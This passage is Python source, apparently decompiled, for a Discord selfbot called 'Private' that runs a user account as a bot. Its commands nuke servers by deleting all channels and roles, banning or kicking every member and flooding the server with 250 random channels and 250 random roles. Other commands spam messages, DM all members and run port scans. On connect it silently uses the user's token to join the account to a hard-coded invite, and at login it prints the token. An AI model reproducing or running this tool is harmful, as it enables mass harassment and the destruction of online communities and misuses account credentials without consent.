    with open('config.json') as (f):
        config = json.load(f)
    token = config.get('token')
    prefix = config.get('prefix')
    loop = asyncio.get_event_loop()

    def Clear():
        os.system('cls')

    Clear()

    def Init():
        if config.get('token') == 'token-here':
            Clear()
            print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file" + Fore.RESET)
        else:
            token = config.get('token')
        try:
            Private.run(token, bot=False, reconnect=True)
            os.system(f"title (Private Selfbot) - Version {SELFBOT.__version__}")
        except discord.errors.LoginFailure:
            print(Fore.LIGHTRED_EX + 'Not Valid Token')
            os.system('pause')
            os.close()

    class Login(discord.Client):

        async def on_connect(self):
            guilds = len(self.guilds)
            users = len(self.users)
            print('')
            print(f"Connected to: [{self.user.name}]")
            print(f"Token: {self.http.token}")
            print(f"Guilds: {guilds}")
            print(f"Users: {users}")
            print('-------------------------------')
            await self.logout()

    def async_executor():

        def outer(func):

            @functools.wraps(func)
            def inner(*args, **kwargs):
                thing = (functools.partial)(func, *args, **kwargs)
                return loop.run_in_executor(None, thing)

            return inner

        return outer

    def RandString():
        return ''.join((random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))))

    colorama.init()
    Private = discord.Client()
    Private = commands.Bot(description='Private SelfBot',
      command_prefix=prefix,
      self_bot=True)
    Private.remove_command('help')

    @tasks.loop(seconds=3)
    @Private.event
    async def on_message_edit(before, after):
        await Private.process_commands(after)

    @Private.event
    async def on_connect():
        Clear()
        print(f"P{Fore.LIGHTCYAN_EX}\n\n\n     ██▓███   ██▀███   ██▓ ██▒   █▓ ▄▄▄     ▄▄▄█████▓▓█████      ██████ ▓█████  ██▓      █████▒▄▄▄▄    ▒█████  ▄▄▄█████▓\n    ▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▒████▄   ▓  ██▒ ▓▒▓█   ▀    ▒██    ▒ ▓█   ▀ ▓██▒    ▓██   ▒▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒\n    ▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒██  ▀█▄ ▒ ▓██░ ▒░▒███      ░ ▓██▄   ▒███   ▒██░    ▒████ ░▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░\n    ▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄      ▒   ██▒▒▓█  ▄ ▒██░    ░▓█▒  ░▒██░█▀  ▒██   ██░░ ▓██▓ ░ \n    ▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░   ▓█   ▓██▒ ▒██▒ ░ ░▒████▒   ▒██████▒▒░▒████▒░██████▒░▒█░   ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ \n    ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░   ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░▓  ░ ▒ ░   ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   \n    ░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░    ▒   ▒▒ ░   ░     ░ ░  ░   ░ ░▒  ░ ░ ░ ░  ░░ ░ ▒  ░ ░     ▒░▒   ░   ░ ▒ ▒░     ░    \n    ░░         ░░   ░  ▒ ░     ░░    ░   ▒    ░         ░      ░  ░  ░     ░     ░ ░    ░ ░    ░    ░ ░ ░ ░ ▒    ░      \n                ░      ░        ░        ░  ░           ░  ░         ░     ░  ░    ░  ░        ░          ░ ░           \n                               ░                                                                    ░                   \n\n                            |---------------------------------------------|\n                            |                PRIVATE v1.6                 |\n                            |---------------------------------------------|\n                            | $ {Fore.RED}Private {Fore.CYAN}{SELFBOT.__version__}                               |\n                            | § {Fore.BLUE}Logged in: {Private.user.name}#{Private.user.discriminator}           |\n                            | § {Fore.MAGENTA}Discord-ID: {Fore.LIGHTGREEN_EX}{Private.user.id}            |\n                            | § {Fore.CYAN}Enter the Commands with: {Fore.GREEN}{prefix}                |\n                            | § You have to Enter the commands in Discord |\n                            |---------------------------------------------|\n\n\n        " + Fore.RESET)
        ctypes.windll.kernel32.SetConsoleTitleW(f"[Private Selfbot v{SELFBOT.__version__}]")
        headers = {'Authorization':token, 
         'Content-Type':'application/json', 
         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        r = requests.post('https://discordapp.com/api/v6/invite/BGu62Ha', headers=headers)
        if r.status_code == 200:
            return True
        return False

    @Private.command()
    async def help(ctx):
        await ctx.send("\n---------------------------|\nWelcome to help menu |\n---------------------------|        \n\n\n.help = Shows all commands\n.clear = clear all your messages\n.destroy = destroys a Server completly ;)(Admin Permission)\n.spam [how much times] [your message] = You can spam a message--> Example: .spam 10 TestingMessage10Times\n.banall = will ban all people on that Server(Admin Permission)\n.unbanall = unban all people on that Server(Admin Permission)\n.kickall = kicks all people of that Server(Admin Permission)\n.dmall [message] = It will dm all people\n.scanport = It scan's a port with Nmap.\n\n\n")

    @Private.command()
    async def clear(ctx):
        await ctx.message.delete()
        await ctx.send('ﾠﾠ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nﾠﾠ')

    @Private.command()
    async def banall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass

    @Private.command(aliases=['portscan'])
    async def scanport(ctx, arg1):
        scanyuh = requests.get('https://api.hackertarget.com/nmap/?q=%s' % arg1)
        result = scanyuh.text.strip(' ( https://nmap.org/ )')
        await ctx.send(f"`{result}`")

    @Private.command()
    async def unbanall(ctx):
        await ctx.message.delete()
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await asyncio.sleep(2)
                await ctx.guild.unban(user=(users.user))
            except:
                pass

    @Private.command()
    async def spam(ctx, amount: int, *, message):
        await ctx.message.delete()
        for _i in range(amount):
            await ctx.send(message)

    @Private.command()
    async def kickall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.kick()
            except:
                pass

    @Private.command()
    async def dmall(ctx, *, message):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await asyncio.sleep(5)
                await user.send(message)
            except:
                pass

    @Private.command()
    async def destroy(ctx):
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                pass

        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass

        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass

        try:
            await ctx.guild.edit(name=(RandString()),
              description='I dont really know ;3',
              icon=None,
              banner=None)
        except:
            pass
        else:
            for _i in range(250):
                await ctx.guild.create_text_channel(name=(RandString()))

            for _i in range(250):
                await ctx.guild.create_role(name=(RandString()))

    if __name__ == '__main__':
        Init()


def ControlDCBot():
    print(Fore.LIGHTGREEN_EX + 'Enter the Webhook of the discord Bot!')
    botwebhook = input('> ')
    hook = Webhook(botwebhook)
    while True:
        messages = input('Enter a message: ')
        hook.send(messages)


def ColorChanger():
    os.system('cls && title Choose-Color')
    print("Choose one of the following Color's for the Menu design!")
    print('')
    print('')
    print(Fore.BLUE + 'BLUE  ' + Fore.LIGHTBLUE_EX + '     LIGHTBLUE')
    print(Fore.RED + 'RED  ' + Fore.LIGHTRED_EX + '      LIGHTRED')
    print(Fore.GREEN + 'GREEN  ' + Fore.LIGHTGREEN_EX + '    LIGHTGREEN')
    print(Fore.YELLOW + 'YELLOW  ' + Fore.LIGHTYELLOW_EX + '   LIGHTYELLOW')
    print(Fore.WHITE + 'WHITE  ' + Fore.LIGHTWHITE_EX + '    LIGHTWHITE')
    print(Fore.MAGENTA + 'MAGENTA  ' + Fore.LIGHTMAGENTA_EX + '  LIGHTMAGENTA')
    print(Fore.CYAN + 'CYAN  ' + Fore.LIGHTCYAN_EX + '     LIGHTCYAN')
    print(Fore.LIGHTBLACK_EX + '           LIGHTBLACK')
    print('')
    print('')
    color = input('> ')
    c = {'color': color}
    with open('colorsettings.json', 'w', encoding='utf8') as (json_file):
        json.dump(c, json_file, ensure_ascii=True)


Design()
Modules()

def ResetTool():
    os.system('pause')
    os.system('cls && title Private Tool')
    getapi()
    Design()
    Modules()


while True:
    ResetTool()
